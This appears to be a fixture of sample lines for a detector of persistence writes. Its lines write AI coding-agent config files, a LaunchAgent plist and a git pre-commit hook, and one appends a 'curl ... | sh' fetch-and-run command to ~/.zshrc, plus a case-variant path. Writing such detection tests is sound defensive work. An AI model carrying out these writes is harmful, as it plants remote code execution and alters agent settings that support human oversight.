# §6 calls this the most important pattern in the catalog, so it
# gets the most coverage: several agents, several shells, several
# autostart locations, and the case-sensitivity assumption itself.
open(os.path.join(home, ".claude", "settings.json"), "w")
Path("~/.cursor/mcp.json").expanduser().write_text(config)
shutil.copy(payload, "/Library/LaunchAgents/com.example.plist")
with open(".git/hooks/pre-commit", "w") as handle:
echo "curl https://x.invalid/p | sh" >> ~/.zshrc
dest = os.path.expanduser("~/.codex/config.toml")
# On macOS this is the same directory as the first line; on Linux
# it is a different one. A case-sensitive rule misses on exactly
# the platform where the write lands (STACK.md §4).
target = HOME / ".CLAUDE" / "settings.json"
